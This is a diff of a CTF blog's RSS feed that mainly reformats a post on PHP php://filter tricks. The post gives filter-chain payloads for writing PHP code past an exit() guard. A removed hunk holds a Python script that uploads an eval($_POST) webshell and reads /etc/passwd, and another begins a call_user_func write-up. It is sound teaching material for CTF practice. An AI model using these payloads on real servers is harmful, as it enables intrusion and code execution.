 &lt;tr&gt;
@@ -3616,7 +3387,7 @@ OLDPWD=/app
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;trick&#34;&gt;Trick&lt;/h2&gt;
+&lt;h3 id=&#34;trick&#34;&gt;Trick&lt;/h3&gt;
 &lt;p&gt;1、嵌套多个过滤器实现过滤器组合拳&lt;/p&gt;
 &lt;p&gt;例题：&lt;a href=&#34;(https://buuoj.cn/)&#34;&gt;[WMCTF 2020]check in 2&lt;/a&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -3638,14 +3409,14 @@ OLDPWD=/app
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;3、遇到不认识的过滤器php只会报个warning，不会终止运行&lt;/p&gt;
-&lt;h2 id=&#34;过滤器&#34;&gt;过滤器&lt;/h2&gt;
+&lt;h3 id=&#34;过滤器&#34;&gt;过滤器&lt;/h3&gt;
 &lt;blockquote&gt;
 &lt;p&gt;参考：
 &lt;a href=&#34;https://www.php.net/manual/zh/wrappers.php&#34;&gt;官方手册&lt;/a&gt;
 &lt;a href=&#34;https://www.php.net/manual/zh/filters.php&#34;&gt;可用过滤器列表&lt;/a&gt;
 &lt;a href=&#34;https://www.anquanke.com/post/id/202510&#34;&gt;探索php://filter在实战当中的奇技淫巧&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h3 id=&#34;大纲&#34;&gt;大纲&lt;/h3&gt;
+&lt;h4 id=&#34;大纲&#34;&gt;大纲&lt;/h4&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
@@ -3696,38 +3467,38 @@ OLDPWD=/app
 &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mdecrypt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.*&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;//解密过滤器
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h3 id=&#34;字符串过滤器&#34;&gt;字符串过滤器&lt;/h3&gt;
-&lt;h4 id=&#34;stringrot13&#34;&gt;string.rot13&lt;/h4&gt;
+&lt;/div&gt;&lt;h4 id=&#34;字符串过滤器&#34;&gt;字符串过滤器&lt;/h4&gt;
+&lt;h5 id=&#34;stringrot13&#34;&gt;string.rot13&lt;/h5&gt;
 &lt;p&gt;（自 PHP 4.3.0 起）对字符进行简单的单表替换，将字母表的后13位字母替换前面的13位字母，遇到其他的字符直接跳过。&lt;/p&gt;
-&lt;h4 id=&#34;stringtoupperstringtolower&#34;&gt;string.toupper、string.tolower&lt;/h4&gt;
+&lt;h5 id=&#34;stringtoupperstringtolower&#34;&gt;string.toupper、string.tolower&lt;/h5&gt;
 &lt;p&gt;（自 PHP 5.0.0 起）字符串大小写转换&lt;/p&gt;
-&lt;h4 id=&#34;stringstrip_tags&#34;&gt;string.strip_tags&lt;/h4&gt;
+&lt;h5 id=&#34;stringstrip_tags&#34;&gt;string.strip_tags&lt;/h5&gt;
 &lt;p&gt;string.strip_tags返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果。&lt;strong&gt;本特性已自 PHP 7.3.0 起废弃&lt;/strong&gt;。&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;注意：HTML标签和 PHP 标签&lt;code&gt;&amp;lt;?代码?&amp;gt;&lt;/code&gt;也会被去除。这里是硬编码处理的，所以无法通过 allowable_tags 参数进行改变。&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h3 id=&#34;转换过滤器&#34;&gt;转换过滤器&lt;/h3&gt;
-&lt;h4 id=&#34;convertbase64-encode&#34;&gt;convert.base64-encode&lt;/h4&gt;
+&lt;h4 id=&#34;转换过滤器&#34;&gt;转换过滤器&lt;/h4&gt;
+&lt;h5 id=&#34;convertbase64-encode&#34;&gt;convert.base64-encode&lt;/h5&gt;
 &lt;p&gt;对给定字符串进行base64编码&lt;/p&gt;
-&lt;h4 id=&#34;convertbase64-decode&#34;&gt;convert.base64-decode&lt;/h4&gt;
+&lt;h5 id=&#34;convertbase64-decode&#34;&gt;convert.base64-decode&lt;/h5&gt;
 &lt;p&gt;对给定base64编码内容解码&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;注意：&lt;/p&gt;
-&lt;p&gt;1、base64解码时是4bytes一组，因此将目标字符解码成乱码时需手动添加字符凑够4的倍数
-2、&lt;code&gt;convert.base64-decode&lt;/code&gt;过滤器读文件时会将一些非base64字符给过滤掉后再进行&lt;code&gt;decode&lt;/code&gt;，和一些过滤器组合可以用来删除文件内容&lt;/p&gt;
+&lt;p&gt;1、base64解码时是4bytes一组，因此将目标字符解码成乱码时需手动添加字符凑够4的倍数&lt;/p&gt;
+&lt;p&gt;2、&lt;code&gt;convert.base64-decode&lt;/code&gt;过滤器读文件时会将一些非base64字符给过滤掉后再进行&lt;code&gt;decode&lt;/code&gt;，和一些过滤器组合可以用来删除文件内容&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h4 id=&#34;convertquoted-printable-encode&#34;&gt;convert.quoted-printable-encode&lt;/h4&gt;
+&lt;h5 id=&#34;convertquoted-printable-encode&#34;&gt;convert.quoted-printable-encode&lt;/h5&gt;
 &lt;p&gt;将 8-bit 字符串转换成 quoted-printable 字符串&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;8-bit字符串：10000000~11111111，即ASCII值在128~255之间的字符串
-quoted-printable 字符串：&lt;code&gt;=十六进制形式&lt;/code&gt;，如=42为B&lt;/p&gt;
+&lt;p&gt;8-bit字符串：10000000~11111111，即ASCII值在128~255之间的字符串&lt;/p&gt;
+&lt;p&gt;quoted-printable 字符串：&lt;code&gt;=十六进制形式&lt;/code&gt;，如=42为B&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h4 id=&#34;convertquoted-printable-decode&#34;&gt;convert.quoted-printable-decode&lt;/h4&gt;
+&lt;h5 id=&#34;convertquoted-printable-decode&#34;&gt;convert.quoted-printable-decode&lt;/h5&gt;
 &lt;p&gt;将 quoted-printable 字符串转换为 8-bit 字符串&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;注意：可以转化从=00到=FF，即ASCII值从0~255之间的字符串&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h4 id=&#34;converticonv&#34;&gt;convert.iconv&lt;/h4&gt;
+&lt;h5 id=&#34;converticonv&#34;&gt;convert.iconv&lt;/h5&gt;
 &lt;p&gt;字符串按要求的字符编码来转换&lt;/p&gt;
 &lt;p&gt;使用格式：&lt;code&gt;convert.iconv.当前编码.目标编码&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;支持的&lt;a href=&#34;https://www.php.net/manual/en/mbstring.supported-encodings.php&#34;&gt;编码方式&lt;/a&gt;&lt;/p&gt;
@@ -3735,8 +3506,8 @@ quoted-printable 字符串：&lt;code&gt;=十六进制形式&lt;/code&gt;，如=
 &lt;p&gt;* 表示该编码也可以在正则表达式中使用。
 ** 表示该编码自 &lt;strong&gt;PHP&lt;/strong&gt; 5.4.0 始可用。&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h3 id=&#34;压缩过滤器&#34;&gt;压缩过滤器&lt;/h3&gt;
-&lt;h4 id=&#34;zlibdeflate压缩zlibinflate解压&#34;&gt;zlib.deflate压缩、zlib.inflate解压&lt;/h4&gt;
+&lt;h4 id=&#34;压缩过滤器&#34;&gt;压缩过滤器&lt;/h4&gt;
+&lt;h5 id=&#34;zlibdeflate压缩zlibinflate解压&#34;&gt;zlib.deflate压缩、zlib.inflate解压&lt;/h5&gt;
 &lt;blockquote&gt;
 &lt;p&gt;自 PHP 5.1.0 起，在激活 &lt;a href=&#34;https://www.php.net/manual/zh/ref.zlib.php&#34;&gt;zlib&lt;/a&gt;的前提下可用。也可以通过安装来自 &lt;a href=&#34;https://pecl.php.net/&#34;&gt;» PECL&lt;/a&gt;的 &lt;a href=&#34;https://pecl.php.net/package/zlib_filter&#34;&gt;» zlib_filter&lt;/a&gt;包作为一个后门在 &lt;code&gt;5.0.x&lt;/code&gt;版中使用。此过滤器在 PHP 4 中 &lt;em&gt;不可用&lt;/em&gt;。&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -3744,13 +3515,13 @@ quoted-printable 字符串：&lt;code&gt;=十六进制形式&lt;/code&gt;，如=
 &lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;: 压缩过滤器不产生命令行工具如 &lt;code&gt;gzip&lt;/code&gt;的头和尾信息。只是压缩和解压数据流中的有效载荷部分。&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h4 id=&#34;bzip2compressbzip2decompress&#34;&gt;bzip2.compress、bzip2.decompress&lt;/h4&gt;
+&lt;h5 id=&#34;bzip2compressbzip2decompress&#34;&gt;bzip2.compress、bzip2.decompress&lt;/h5&gt;
 &lt;blockquote&gt;
 &lt;p&gt;自PHP 5.1.0 起，在激活 &lt;a href=&#34;https://www.php.net/manual/zh/ref.bzip2.php&#34;&gt;bz2&lt;/a&gt;支持的前提下可用。也可以通过安装来自 &lt;a href=&#34;https://pecl.php.net/&#34;&gt;» PECL&lt;/a&gt;的 &lt;a href=&#34;https://pecl.php.net/package/bz2_filter&#34;&gt;» bz2_filter&lt;/a&gt;包作为一个后门在 &lt;code&gt;5.0.x&lt;/code&gt;版中使用。此过滤器在 PHP 4 中不可用。&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;工作方式与上面相同&lt;/p&gt;
-&lt;h3 id=&#34;加密过滤器&#34;&gt;加密过滤器&lt;/h3&gt;
-&lt;h4 id=&#34;mcryptmdecrypt&#34;&gt;mcrypt.*、mdecrypt.*&lt;/h4&gt;
+&lt;h4 id=&#34;加密过滤器&#34;&gt;加密过滤器&lt;/h4&gt;
+&lt;h5 id=&#34;mcryptmdecrypt&#34;&gt;mcrypt.*、mdecrypt.*&lt;/h5&gt;
 &lt;p&gt;&lt;code&gt;mcrypt.*&lt;/code&gt;和 &lt;code&gt;mdecrypt.*&lt;/code&gt;使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持 &lt;a href=&#34;https://www.php.net/manual/zh/ref.mcrypt.php&#34;&gt;mcrypt 扩展库&lt;/a&gt;中相同的算法，格式为 &lt;code&gt;mcrypt.ciphername&lt;/code&gt;，其中 &lt;code&gt;ciphername&lt;/code&gt;是密码的名字，将被传递给 &lt;a href=&#34;https://www.php.net/manual/zh/function.mcrypt-module-open.php&#34;&gt;mcrypt_module_open()&lt;/a&gt;。&lt;/p&gt;
 &lt;p&gt;过滤器参数&lt;/p&gt;
 &lt;table&gt;
@@ -3796,8 +3567,8 @@ quoted-printable 字符串：&lt;code&gt;=十六进制形式&lt;/code&gt;，如=
 &lt;/tbody&gt;
 &lt;/table&gt;
 &lt;p&gt;这里只是做个了解，代码中使用可以参考&lt;a href=&#34;https://blog.csdn.net/qq_44657899/article/details/109300335#mcrypt_mdecrypt_209&#34;&gt;文章&lt;/a&gt;，传参的话不知道咋用emm&lt;/p&gt;
-&lt;h1 id=&#34;应用&#34;&gt;应用&lt;/h1&gt;
-&lt;h2 id=&#34;死亡exit&#34;&gt;死亡exit()&lt;/h2&gt;
+&lt;h2 id=&#34;应用&#34;&gt;应用&lt;/h2&gt;
+&lt;h3 id=&#34;死亡exit&#34;&gt;死亡exit()&lt;/h3&gt;
 &lt;blockquote&gt;
 &lt;p&gt;参考：
 &lt;a href=&#34;https://xz.aliyun.com/t/8163&#34;&gt;file_put_content和死亡·杂糅代码之缘&lt;/a&gt;
@@ -3830,9 +3601,9 @@ quoted-printable 字符串：&lt;code&gt;=十六进制形式&lt;/code&gt;，如=
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;说明：情况2与情况1不同之处在于content既可以作为内容，也可以作为写入文件名，且使用&lt;code&gt;php://filter&lt;/code&gt;时写入内容会由于&lt;code&gt;//&lt;/code&gt;符号被注释掉(&lt;code&gt;//&lt;/code&gt;符号一般不在正常编码的符号表中)，因此这种情况下的payload需要处理一下。&lt;/p&gt;
-&lt;h3 id=&#34;单一过滤器&#34;&gt;单一过滤器&lt;/h3&gt;
+&lt;h4 id=&#34;单一过滤器&#34;&gt;单一过滤器&lt;/h4&gt;
 &lt;p&gt;下面payload都省略了write参数，因为在使用&lt;code&gt;file_put_contents&lt;/code&gt;函数时会自动使用write参数。&lt;/p&gt;
-&lt;h4 id=&#34;情况一&#34;&gt;情况一&lt;/h4&gt;
+&lt;h5 id=&#34;情况一&#34;&gt;情况一&lt;/h5&gt;
 &lt;p&gt;&lt;strong&gt;payload1&lt;/strong&gt;：&lt;code&gt;string.rot13&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;条件：short_open_tag=off&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;?file=php://filter/string.rot13/resource=tyskill.php&amp;amp;content=&amp;lt;?cuc cucvasb();
@@ -3845,7 +3616,7 @@ quoted-printable 字符串：&lt;code&gt;=十六进制形式&lt;/code&gt;，如=
 ?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=tyskill.php&amp;amp;content=tyskill?&amp;lt;hp phpipfn(o;)
 # usc-4: 对目标字符串进行4位一反转
 ?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=tyskill.php&amp;amp;content=tyskill?&amp;lt;hp phpipfn(o;)
-&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;情况二&#34;&gt;情况二&lt;/h4&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;情况二&#34;&gt;情况二&lt;/h5&gt;
 &lt;p&gt;与上面的payload大致相同，无非就是将写入内容嵌套进过滤器内部，由于php遇到不认识的过滤器只是报个warning，不会终止运行，所以写入内容能跟着payload进入文件。&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;payload1&lt;/strong&gt;：&lt;code&gt;string.rot13&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;：short_open_tag=off&lt;/p&gt;
@@ -3861,14 +3632,14 @@ quoted-printable 字符串：&lt;code&gt;=十六进制形式&lt;/code&gt;，如=
 ?content=php://filter/convert.iconv.UCS-2LE.UCS-2BE|tyskill?&amp;lt;hp phpipfn(o;)/resource=tyskill.php
 # usc-4: 对目标字符串进行4位一反转
 ?content=php://filter/convert.iconv.UCS-2LE.UCS-2BE|tyskill?&amp;lt;hp phpipfn(o;)/resource=tyskill.php
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;过滤器组合拳&#34;&gt;过滤器组合拳&lt;/h3&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;过滤器组合拳&#34;&gt;过滤器组合拳&lt;/h4&gt;
 &lt;p&gt;由于&lt;code&gt;string.strip_tags&lt;/code&gt;可以将php标签&lt;code&gt;&amp;lt;?...?&amp;gt;&lt;/code&gt;及其内容全部删除，因此只要使用编码将&lt;code&gt;&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;隐藏，那么它可以作为一种万金油搭配(php&amp;lt;7.3.0)&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;注意：
 1、不要忘了写入内容时添加&lt;code&gt;?&amp;gt;&lt;/code&gt;终止删除效果
 2、由于情况二的payload都是从情况一的payload修改而来，因此二的payload理所当然适用于一。&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h4 id=&#34;情况一-1&#34;&gt;情况一&lt;/h4&gt;
+&lt;h5 id=&#34;情况一-1&#34;&gt;情况一&lt;/h5&gt;
 &lt;p&gt;&lt;strong&gt;payload1&lt;/strong&gt;：&lt;code&gt;string.strip_tags|convert.base64-decode&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;：php&amp;lt;7.3.0&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;?file=php://filter/string.strip_tags|convert.base64-decode/resource=tyskill.php&amp;amp;content=?&amp;gt;PD9waHAgcGhwaW5mbygpOw==
@@ -3892,7 +3663,7 @@ quoted-printable 字符串：&lt;code&gt;=十六进制形式&lt;/code&gt;，如=
 &lt;/blockquote&gt;
 &lt;p&gt;这写入内容看着就不像能成功的样子吧。。。也不知道啥条件下能解析成功&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;?file=php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=tyskill.php&amp;amp;content=&amp;lt;?php+phpinfo();
-&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;情况二-1&#34;&gt;情况二&lt;/h4&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;情况二-1&#34;&gt;情况二&lt;/h5&gt;
 &lt;p&gt;&lt;strong&gt;payload1&lt;/strong&gt;：&lt;code&gt;string.strip_tags|convert.base64-decode&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;：php&amp;lt;7.3.0&lt;/p&gt;
 &lt;p&gt;之前的写入失败是由于resource后面的=导致解码失败，借助&lt;code&gt;string.strip_tags&lt;/code&gt;的删除效果我们可以通过php标签删除=。&lt;/p&gt;
@@ -3910,8 +3681,8 @@ quoted-printable 字符串：&lt;code&gt;=十六进制形式&lt;/code&gt;，如=
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;payload3（&lt;strong&gt;失败&lt;/strong&gt;）：&lt;code&gt;zlib.deflate|string.tolower|zlib.inflate&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;除了上面出现过的&lt;code&gt;@&lt;/code&gt;无法运行问题，还出现了新的问题：内容加了&lt;code&gt;&amp;lt;?&lt;/code&gt;就写不进去，不加又不能解析。。。&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;?content=php://filter/zlib.deflate|string.tolower|zlib.inflate|%0a&amp;lt;?php phpinfo();/resource=tyskill.php
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;其他&#34;&gt;其他&lt;/h2&gt;
-&lt;h3 id=&#34;segment-fault&#34;&gt;segment fault&lt;/h3&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;其他&#34;&gt;其他&lt;/h3&gt;
+&lt;h4 id=&#34;segment-fault&#34;&gt;segment fault&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p&gt;参考：
 &lt;a href=&#34;https://www.anquanke.com/post/id/201136&#34;&gt;PHP LFI 利用临时文件 Getshell 姿势&lt;/a&gt;&lt;/p&gt;
@@ -3922,29 +3693,13 @@ quoted-printable 字符串：&lt;code&gt;=十六进制形式&lt;/code&gt;，如=
 &lt;/blockquote&gt;
 &lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;：7.0.0 &amp;lt;= PHP Version &amp;lt; 7.0.28&lt;/p&gt;
 &lt;p&gt;例题：&lt;a href=&#34;https://buuoj.cn/&#34;&gt;[NPUCTF2020]ezinclude&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;exp&lt;/p&gt;
+&lt;p&gt;payload&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
-&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BytesIO&lt;/span&gt;
-&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;?php eval($_POST[a]);?&amp;gt;&amp;#34;&lt;/span&gt;
-&lt;span class=&#34;n&#34;&gt;file_data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BytesIO&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://bd5b2eb6-9865-4e62-8ccf-b4c34c5541fd.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&amp;#34;&lt;/span&gt;
-&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-    &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;allow_redirects&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;span class=&#34;k&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;filter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip_tags&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;resource&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;etc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;passwd&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;</description>
@@ -4411,7 +4166,7 @@ Content-Length: 177
                 <title>[BUUOJ]纵横杯1st线下赛复现</title>
                 <link>https://tyskill.github.io/posts/zhb1st/</link>
                 <guid isPermaLink="true">https://tyskill.github.io/posts/zhb1st/</guid>
-                <pubDate>Thu, 22 Apr 2021 15:00:00 &#43;0000</pubDate>
+                <pubDate>Thu, 22 Apr 2021 00:00:00 &#43;0000</pubDate>
                 
                     <author>tyskill@foxmail.com (tyskill)</author>
                 
@@ -7455,323 +7210,6 @@ wget -r 192.168.150.129:8090/ &lt;span class=&#34;c1&#34;&gt;# 下载靶机firef
                                 
                                 
                                     <category domain="https://tyskill.github.io/tags/firefox/">firefox</category>
-                                
-                            
-                        
-                    
-                
-            </item>
-        
-            <item>
-                <title>CTFshow-1024杯</title>
-                <link>https://tyskill.github.io/posts/ctfshow1024%E6%9D%AF/</link>
-                <guid isPermaLink="true">https://tyskill.github.io/posts/ctfshow1024%E6%9D%AF/</guid>
-                <pubDate>Sat, 23 Jan 2021 00:00:00 &#43;0000</pubDate>
-                
-                    <author>tyskill@foxmail.com (tyskill)</author>
-                
-                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
-                
-                    <description>&lt;h1 id=&#34;前言&#34;&gt;前言&lt;/h1&gt;
-&lt;p&gt;      这次Misc就离谱，一堆手撸+脑洞，脑子拼不过大佬，手也拼不过，只能赛后卑微复现。。。&lt;/p&gt;
-&lt;h1 id=&#34;web&#34;&gt;Web&lt;/h1&gt;
-&lt;h2 id=&#34;1024_web签到&#34;&gt;1024_WEB签到&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
-&lt;span class=&#34;nx&#34;&gt;error_reporting&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;span class=&#34;nx&#34;&gt;call_user_func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;f&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;blockquote&gt;
-&lt;p&gt;call_user_func函数介绍：&lt;br&gt;
-      第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;依据语法我们可以传值phpinfo，结合空参数完成调用phpinfo()的命令。&lt;/p&gt;
-&lt;p&gt;在phpinfo页面提示了&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th style=&#34;text-align:center&#34;&gt;ctfshow&lt;/th&gt;
